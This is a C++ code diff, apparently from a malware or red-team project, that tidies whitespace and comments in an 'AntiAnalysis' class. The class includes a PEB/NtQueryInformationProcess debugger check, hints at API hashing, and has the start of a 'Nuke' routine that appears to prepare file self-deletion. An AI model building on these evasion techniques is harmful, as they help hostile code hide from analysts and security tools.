@@ -9,10 +9,7 @@ bool AntiAnalysis::Peb(API::APIResolver& resolver)
     PROCESS_BASIC_INFORMATION pbi;
 
     API::API_ACCESS api = resolver.GetAPIAccess();
-
-
-    // Replace these functions with API hashed functions
-    HANDLE  hProcess = GetCurrentProcess();
+    HANDLE hProcess     = GetCurrentProcess();
 
     if (api.func.pNtQueryInformationProcess)
     {
@@ -31,16 +28,9 @@ bool AntiAnalysis::Peb(API::APIResolver& resolver)
                 return true;
         }
         else
-        {
-           // tools.ShowError("Failed with code: ", GetLastError());
             return false;
-        }
+        
     }
-    else
-    {
-        //tools.ShowError("Failed to get NtQueryInformationProcess address");
-    }
-
     return false;
 }
 
@@ -70,7 +60,7 @@ int AntiAnalysis::Nuke(API::APIResolver& resolver)
     auto resolve = resolver.GetAPIAccess();
 
     pRename = (PFILE_RENAME_INFO)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sRename); // Allocate memory for structure
-
+     
     if (!pRename) 
         return FALSE;
     
